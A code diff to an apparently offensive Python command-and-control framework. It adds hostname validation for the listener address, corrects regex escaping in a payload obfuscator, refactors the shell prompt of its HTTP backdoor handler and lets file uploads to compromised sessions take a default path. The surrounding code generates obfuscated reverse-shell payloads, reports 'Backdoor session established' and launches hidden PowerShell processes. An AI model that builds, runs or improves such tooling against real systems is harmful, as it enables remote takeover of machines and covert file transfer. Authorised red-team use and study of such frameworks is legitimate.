@@ -134,15 +134,36 @@ class Payload_Generator:
 			# Check if valid IP address
 			#re.search('[\d]{1,3}[\.][\d]{1,3}[\.][\d]{1,3}[\.][\d]{1,3}', lhost_value)
 			payload.parameters["lhost"] = str(ip_address(lhost_value))
+			return 
 
 		except ValueError:
 
 			try:
 				# Check if valid interface
 				payload.parameters["lhost"] = ni.ifaddresses(lhost_value)[ni.AF_INET][0]['addr']
+				return 
 
 			except:
-				return False
+				# Check if valid hostname
+				if len(lhost_value) > 255:
+					payload.parameters["lhost"] = False
+					print('Hostname length greater than 255 characters.')
+					return
+				if lhost_value[-1] == ".":
+					lhost_value = lhost_value[:-1]  # Strip trailing dot (used to indicate an absolute domain name and technically valid according to DNS standards)
+				disallowed = re.compile(r"[^A-Z\d-]", re.IGNORECASE)
+				if all(len(part) and not part.startswith("-") and not part.endswith("-") and not disallowed.search(part) for part in lhost_value.split(".")):
+					# Check if hostname is resolvable
+					try:
+						socket.gethostbyname(lhost_value)
+						payload.parameters["lhost"] = lhost_value
+						return
+					except:
+						print('Failed to resolve LHOST.')
+						pass				
+				
+				payload.parameters["lhost"] = False
+				return
 
 
 
@@ -188,15 +209,15 @@ class Payload_Generator:
 						del payload, template
 						return
 
-					if payload.meta['handler'] == 'hoaxshell' or not Payload_Generator_Settings.validate_lhost_as_ip:
-						self.parse_lhost(payload, args_dict["lhost"])
-						payload.parameters["lhost"] = args_dict["lhost"] if (not payload.parameters["lhost"] and (len(args_dict["lhost"]) < 255)) else payload.parameters["lhost"]
+					#if payload.meta['handler'] == 'hoaxshell' or not Payload_Generator_Settings.validate_lhost_as_ip:
+					self.parse_lhost(payload, args_dict["lhost"])
+						#payload.parameters["lhost"] = args_dict["lhost"] if (not payload.parameters["lhost"] and (len(args_dict["lhost"]) < 255)) else payload.parameters["lhost"]
 					
-					else:
-						self.parse_lhost(payload, args_dict["lhost"])
+					# else:
+					# 	self.parse_lhost(payload, args_dict["lhost"])
 
 					if not payload.parameters["lhost"]:
-						print('Error parsing LHOST. Invalid IP or Interface.')
+						print('Error parsing LHOST. Invalid IP, Hostname or Interface.')
 						return
 
 					# Check for unrecognized arguments
@@ -295,7 +316,7 @@ class Obfuscator:
 			if path == 1:
 				return char
 
-			return '\w' if path == 2 else f'({char}|\\?)'
+			return '\\w' if path == 2 else f'({char}|\\?)'
 
 
 
@@ -304,7 +325,7 @@ class Obfuscator:
 			if path == 1:
 				return char
 
-			return '\d' if path == 2 else f'({char}|\\?)'
+			return '\\d' if path == 2 else f'({char}|\\?)'
 
 
 
@@ -316,7 +337,7 @@ class Obfuscator:
 			if path == 1:
 				return char
 
-			return '\W' if path == 2 else f'({char}|\\?)'
+			return '\\W' if path == 2 else f'({char}|\\?)'
 
 		else:
 			return None
@@ -331,7 +352,7 @@ class Obfuscator:
 	def string_to_regex(self, string):
 
 		# First check if string is actually a regex
-		if re.match( "^\[.*\}$", string):
+		if re.match( "^\\[.*\\}$", string):
 			return string
 
 		else:
@@ -451,7 +472,7 @@ class Obfuscator:
 	def mask_payload(self, payload):
 
 		# Obfuscate variable name definitions
-		variables = re.findall("\$[A-Za-z0-9_]*={1}", payload)
+		variables = re.findall("\\$[A-Za-z0-9_]*={1}", payload)
 
 		if variables:
 
@@ -505,7 +526,7 @@ class Obfuscator:
 
 
 		# Randomize the case of each char in parameter names
-		ps_parameters = re.findall("\s-[A-Za-z]*", payload)
+		ps_parameters = re.findall("\\s-[A-Za-z]*", payload)
 
 		if ps_parameters:
 			for param in ps_parameters:
@@ -878,10 +899,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		# Define prompt value:
 		if prompt:
-			Hoaxshell.hoax_prompt = prompt
+			Main_prompt.hoax_prompt = prompt
 
 		else:
-			Hoaxshell.hoax_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
+			Main_prompt.hoax_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
 
 		Hoaxshell.active_shell = session_id
 		Hoaxshell.prompt_ready = True
@@ -901,7 +922,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			while Hoaxshell.active_shell:
 
 				if Hoaxshell.prompt_ready:
-					user_input = input(Hoaxshell.hoax_prompt)
+					user_input = input(Main_prompt.hoax_prompt)
 					user_input_clean = re.sub(' +', ' ', user_input).strip()
 					cmd_list = user_input_clean.split(' ')
 					cmd_list[0] = cmd_list[0].lower()
@@ -916,6 +937,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 						Hoaxshell.prompt_ready = False
 						file_path = os.path.expanduser(cmd_list[1])
+						try:
+							out_path = cmd_list[2]
+						except IndexError:
+							out_path = os.path.basename(cmd_list[1])
 
 						if session_id in Sessions_Manager.active_sessions.keys():
 
@@ -931,10 +956,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 									session_owner_id = Sessions_Manager.return_session_attr_value(session_id, 'Owner')
 
 									if session_owner_id == Core_Server.return_server_uniq_id():
-										File_Smuggler.upload_file(file_contents, cmd_list[2], session_id)
+										File_Smuggler.upload_file(file_contents, out_path, session_id)
 
 									else:
-										Core_Server.send_receive_one_encrypted(session_owner_id, [file_contents, cmd_list[2], session_id], 'upload_file')
+										Core_Server.send_receive_one_encrypted(session_owner_id, [file_contents, out_path, session_id], 'upload_file')
 
 							else:
 								print(f'\r[{ERR}] file {file_path} not found.')
@@ -1031,7 +1056,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		Hoaxshell.active_shell = None
 		Hoaxshell.prompt_ready = False
-		Hoaxshell.hoax_prompt = None
+		Main_prompt.hoax_prompt = None
 		Main_prompt.ready = True
 
 
@@ -1040,7 +1065,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	def rst_shell_prompt(prompt = ' > ', prefix = '\r'):
 
 		Hoaxshell.prompt_ready = True
-		sys.stdout.write(prefix + Hoaxshell.hoax_prompt + global_readline.get_line_buffer())
+		sys.stdout.write(prefix + Main_prompt.hoax_prompt + global_readline.get_line_buffer())
 
 
 
@@ -1125,13 +1150,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			try:
 				Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]
 				Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]
+				print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{self.client_address[0]}{END}')
 
 			except IndexError:
 				Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'
 				Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'
+				print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{self.client_address[0]}{END} (hostname and user undefined)')
 				
-			print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{self.client_address[0]}{END}')
-
 			try:
 				Thread(target = self.monitor_shell_state, args = (session_id,), name = f'session_state_monitor_{self.client_address[0]}', daemon = True).start()
 			except:
@@ -1580,7 +1605,7 @@ class Core_Server:
 							Sessions_Manager.active_sessions[session_id]['prompt'] = prompt_value
 
 							if Hoaxshell.active_shell == session_id:
-								Hoaxshell.hoax_prompt = prompt_value
+								Main_prompt.hoax_prompt = prompt_value
 
 						Core_Server.send_msg(conn, self.response_ack(sibling_id))
 
@@ -2136,12 +2161,12 @@ class Core_Server:
 			print('\rProvided IP address is not valid.')
 			authorized = False
 
-		if server_port < 0 or server_port > 65535:
-			print('\rPort must be 0-65535.')
+		if server_port < 1 or server_port > 65535:
+			print('\rPort must be between 1 and 65535.')
 			authorized = False
 
-		# Check if attempt to connect to self
-		if (server_port == Core_Server_Settings.bind_port) and (server_ip in ['127.0.0.1', 'localhost']):
+		# Prevent connecting with self
+		if (server_ip in ['127.0.0.1', 'localhost', '::1', '127.0.0.0', '127.0.0.2', '127.0.0.3', '127.0.0.4', '127.0.0.5', '127.0.0.6', '127.0.0.7', '127.0.0.8', '::1', '0:0:0:0:0:0:0:1', '0:0:0:0:0:0:0:1%0', '[::1]']): # and (server_port == Core_Server_Settings.bind_port)
 			print('\rIf you really want to connect with yourself, try yoga.')
 			authorized = False
 
@@ -2719,7 +2744,7 @@ class TCP_Sock_Multi_Handler:
 								prompt_value = sentinel_value[1][1].lstrip()
 
 								if Hoaxshell.active_shell:
-									Hoaxshell.hoax_prompt = prompt_value
+									Main_prompt.hoax_prompt = prompt_value
 
 								if session_id:
 									# Sessions_Manager.active_sessions[session_id].update({'prompt' : prompt_value, 'Shell' : sentinel_value[2]})
@@ -2786,7 +2811,7 @@ class TCP_Sock_Multi_Handler:
 		if hostname[-1] == ".":
 			hostname = hostname[:-1]
 
-		allowed = re.compile("(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
+		allowed = re.compile("(?!-)[A-Z\\d-]{1,63}(?<!-)$", re.IGNORECASE)
 		return all(allowed.match(x) for x in hostname.split("."))
 
 
@@ -2937,7 +2962,7 @@ class TCP_Sock_Multi_Handler:
 	def search_cmd_for_signature(self, cmd):
 
 		try:
-			sibling_server_id = re.findall("[\S]{1,2}echo '{[a-zA-Z0-9]{32}}'", cmd)[-1]
+			sibling_server_id = re.findall("[\\S]{1,2}echo '{[a-zA-Z0-9]{32}}'", cmd)[-1]
 			sibling_server_id = sibling_server_id.split('echo ')[1].strip('{}\'')
 
 		except:
@@ -3056,7 +3081,7 @@ class Exec_Utils:
 		if shell_type:
 
 			if shell_type == 'powershell.exe':
-				return 'Start-Process $PSHOME\powershell.exe -ArgumentList {' + execution_object + '} -WindowStyle Hidden'
+				return 'Start-Process $PSHOME\\powershell.exe -ArgumentList {' + execution_object + '} -WindowStyle Hidden'
 
 			elif shell_type == 'cmd.exe':
 				return 'start "" cmd /k "' + execution_object + '"'
